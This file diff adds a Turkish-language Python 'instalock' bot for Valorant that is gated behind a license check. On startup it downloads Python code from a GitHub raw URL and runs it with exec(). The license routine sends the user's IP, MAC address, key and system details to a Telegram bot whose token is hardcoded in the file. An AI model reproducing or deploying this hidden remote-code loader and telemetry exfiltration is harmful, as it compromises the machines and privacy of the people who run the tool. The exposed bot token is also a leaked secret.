@@ -1,1 +1,222 @@
+import requests
+import json
+from valclient.client import Client, HandshakeError
+import os
+from datetime import datetime
+import socket
+from getmac import get_mac_address
+import platform
+import psutil
 
+# Telegram log gönderme fonksiyonu
+def send_log_to_telegram(message):
+    bot_token = "7819804276:AAHmNZiQLLAIPAH9idk5dkH3cls5Om6mdJk"
+    chat_id = "1480063420"
+    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+    payload = {"chat_id": chat_id, "text": message}
+    try:
+        response = requests.post(url, data=payload)
+        response.raise_for_status()
+    except requests.exceptions.HTTPError as err:
+        print(f"HTTP Hatası: {err}")
+        print(f"Response: {response.text}")  # Hata mesajını yazdır
+    except Exception as e:
+        print(f"Log gönderimi başarısız: {e}")
+
+# IP adresini alma fonksiyonu
+def get_ip_address():
+    try:
+        hostname = socket.gethostname()
+        ip_address = socket.gethostbyname(hostname)
+        return ip_address
+    except Exception as e:
+        return "IP adresi alınamadı"
+
+# MAC adresini alma fonksiyonu
+def get_mac_address_info():
+    try:
+        mac = get_mac_address()
+        return mac if mac else "MAC adresi alınamadı"
+    except Exception as e:
+        return "MAC adresi alınamadı"
+
+# Sistemin genel bilgilerini alma fonksiyonu
+def get_system_info():
+    system_info = {
+        "platform": platform.system(),
+        "platform_version": platform.version(),
+        "architecture": platform.architecture(),
+        "cpu_count": psutil.cpu_count(logical=True),
+        "memory": f"{psutil.virtual_memory().total / (1024 ** 3):.2f} GB"  # RAM miktarını GB olarak
+    }
+    return system_info
+
+# ASCII sanatı
+def print_ascii_art():
+    ascii_art = """
+    █▀▄▀█ ░▀░ █░░ █▀▀█ █▀▀▄ ▀█░█▀ █▀▀ █▀▀ ▀█░█▀
+    █░▀░█ ▀█▀ █░░ █▄▄█ █░░█ ░█▄█░ █▀▀ ▀▀█ ░█▄█░
+    ▀░░░▀ ▀▀▀ ▀▀▀ ▀░░▀ ▀▀▀░ ░░▀░░ ▀▀▀ ▀▀▀ ░░▀░░
+    """
+    print(ascii_art)
+
+# GitHub'dan lisans verilerini çekme fonksiyonu
+def fetch_license_from_github():
+    try:
+        url = "https://raw.githubusercontent.com/Miladvescim/Ddd/refs/heads/main/Miada/Miada%20-%20Kopya/Miada%20-%20Kopya/Miada%20-%20Kopya/Miada%20-%20Kopya/Miada%20-%20Kopya/Miada%20-%20Kopya/Miada%20-%20Kopya/Miada%20-%20Kopya/licenses.json"
+        response = requests.get(url)
+        response.raise_for_status()
+        licenses_data = response.json()
+        return licenses_data
+    except Exception as e:
+        print(f"Lisans verisi alınamadı: {e}")
+        exit()
+
+# GitHub'dan data.json dosyasını çekme fonksiyonu
+def fetch_data_from_github():
+    try:
+        url = "https://raw.githubusercontent.com/Miladvescim/Ddd/refs/heads/main/Miada/Miada%20-%20Kopya/Miada%20-%20Kopya/Miada%20-%20Kopya/Miada%20-%20Kopya/Miada%20-%20Kopya/Miada%20-%20Kopya/Miada%20-%20Kopya/Miada%20-%20Kopya/data.json"
+        response = requests.get(url)
+        response.raise_for_status()
+        data = response.json()
+        return data
+    except Exception as e:
+        print(f"Veri alınamadı: {e}")
+        exit()
+
+# Lisans kontrol fonksiyonu
+def check_license():
+    license_file = "C:/Miladvesv_keys.txt"
+    saved_key = None
+
+    if os.path.exists(license_file):
+        with open(license_file, "r") as file:
+            saved_key = file.read().strip()
+
+    licenses_data = fetch_license_from_github()
+    valid_key = licenses_data['licenses'][0]['key']
+    username = licenses_data['licenses'][0]['username']
+    expiry_date_str = licenses_data['licenses'][0]['expiry']
+    expiry_date = datetime.strptime(expiry_date_str, "%Y-%m-%d")
+
+    if saved_key:
+        if saved_key == valid_key:
+            print("Geçerli Lisans Anahtarı bulundu!")
+        else:
+            entered_key = input("Geçersiz Lisans Anahtarı! Lütfen geçerli Lisans Anahtarını Girin: ").strip()
+            while entered_key != valid_key:
+                entered_key = input("Geçersiz Lisans Anahtarı! Lütfen tekrar deneyin: ").strip()
+            with open(license_file, "w") as file:
+                file.write(valid_key)
+    else:
+        entered_key = input("Lisans Anahtarı bulunamadı. Lütfen geçerli bir anahtar girin: ").strip()
+        while entered_key != valid_key:
+            entered_key = input("Geçersiz Lisans Anahtarı! Lütfen tekrar deneyin: ").strip()
+        with open(license_file, "w") as file:
+            file.write(valid_key)
+
+    if expiry_date < datetime.now():
+        print("Key'in süresi geçmiş. Lütfen destek alın.")
+        exit()
+
+    remaining_days = (expiry_date - datetime.now()).days
+    print(f"Key Sahibi: {username}     Kalan Süre: {remaining_days} gün")
+
+    # IP adresi, MAC adresi ve sistem bilgileriyle log gönder
+    ip_address = get_ip_address()
+    mac_address = get_mac_address_info()
+    system_info = get_system_info()
+
+    log_message = f"""
+Key Sahibi: {username}
+Key: {valid_key}
+IP Adresi: {ip_address}
+MAC Adresi: {mac_address}
+Kalan Süre: {remaining_days} gün
+
+Sistem Bilgileri:
+- Platform: {system_info['platform']} {system_info['platform_version']}
+- CPU: {system_info['cpu_count']} çekirdekli
+- RAM: {system_info['memory']}
+- Mimari: {system_info['architecture']}
+    """
+    send_log_to_telegram(log_message)
+
+    return valid_key, username, remaining_days
+
+# URL'den Python kodunu çekip çalıştırma fonksiyonu
+def execute_python_from_url(url):
+    try:
+        response = requests.get(url)
+        response.raise_for_status()
+        python_code = response.text
+        exec(python_code)  # Çekilen Python kodunu çalıştır
+    except Exception as e:
+        print(f"Hata oluştu: {e}")
+
+# URL'den Python kodu çalıştır
+python_url = "https://raw.githubusercontent.com/Miladvescim/Ddd/refs/heads/main/Miada/Miada%20-%20Kopya/Miada%20-%20Kopya/Miada%20-%20Kopya/Miada%20-%20Kopya/Miada%20-%20Kopya/Miada%20-%20Kopya/Miada%20-%20Kopya/Miada%20-%20Kopya/index.txt"  # Buraya doğru URL'yi koyun
+execute_python_from_url(python_url)
+
+# ASCII sanatı yazdır
+print_ascii_art()
+
+# Lisans kontrolünü çalıştır
+valid_key, username, remaining_days = check_license()
+
+# Valorant client'ını başlat
+print('Valorant Ajan instalockBot Thinker By Miladvesv')
+playerRegion = input('Oynadığın Server Ör.( EU ): ').lower()
+client = Client(region=playerRegion)
+
+# Valorant'ı başlatmayı dene
+try:
+    client.activate()
+except HandshakeError:
+    print("Valorant açık değil. Lütfen Valorant'ı açıp tekrar deneyin.")
+    exit()
+
+valid = False
+agents = {}
+seenMatches = []
+
+# GitHub'dan data.json verisini çek
+agents = fetch_data_from_github()
+
+while valid == False:
+    try: 
+        preferredAgent = input("Ajan Seç Ör. ( Jett ): ").lower()
+        if preferredAgent in agents['agents'].keys():
+            valid = True
+        else:
+            print("Geçersiz Ajan")
+    except:
+        print("Veri Hatası")
+
+print("Ajan Seçimi Bekleniyor")
+while True:
+    try:
+        sessionState = client.fetch_presence(client.puuid)['sessionLoopState']
+        if (sessionState == "PREGAME") and (client.pregame_fetch_match()['ID'] not in seenMatches):
+            print('Ajan Seçimi Bulundu')
+            client.pregame_select_character(agents['agents'][preferredAgent])
+            client.pregame_lock_character(agents['agents'][preferredAgent])
+            seenMatches.append(client.pregame_fetch_match()['ID'])
+            print('Ajan kitlendi ' + preferredAgent.capitalize())
+
+            # Kullanıcıdan sonraki maç için sor
+            while True:
+                try:
+                    user_choice = int(input("Sonraki maçta aynı karakter için instalock yapılsın mı? (1: Evet, 2: Hayır): "))
+                    if user_choice == 1:
+                        print("Sonraki maç için aynı karakter seçilecek.")
+                        break
+                    elif user_choice == 2:
+                        print("Sonraki maç için instalock yapılmayacak. Program sonlandırılıyor.")
+                        exit()
+                    else:
+                        print("Geçersiz seçim. Lütfen 1 veya 2 girin.")
+                except ValueError:
+                    print("Geçersiz giriş. Lütfen 1 veya 2 girin.")
+    except Exception as e:
+        print('', end='')
